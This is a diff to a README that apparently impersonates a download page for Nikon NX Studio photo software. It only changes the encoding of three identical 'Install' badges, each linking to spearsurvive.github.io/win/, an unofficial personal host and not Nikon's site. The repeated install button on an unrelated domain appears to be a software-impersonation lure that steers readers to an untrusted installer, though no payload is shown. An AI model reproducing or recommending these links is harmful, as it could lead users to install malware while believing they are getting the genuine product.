@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Nikon NX Studio](https://img.shields.io/badge/⬇_Install_Nikon%20NX%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon NX Studio](https://img.shields.io/badge/⬇_Install_Nikon+NX+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Nikon NX Studio is a free photo browsing, editing, and RAW development applicati
 
 <div align="center">
 
-[![⬇ Install Nikon NX Studio](https://img.shields.io/badge/⬇_Install_Nikon%20NX%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon NX Studio](https://img.shields.io/badge/⬇_Install_Nikon+NX+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Nikon NX Studio is a free photo browsing, editing, and RAW development applicati
 
 <div align="center">
 
-[![⬇ Install Nikon NX Studio](https://img.shields.io/badge/⬇_Install_Nikon%20NX%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon NX Studio](https://img.shields.io/badge/⬇_Install_Nikon+NX+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
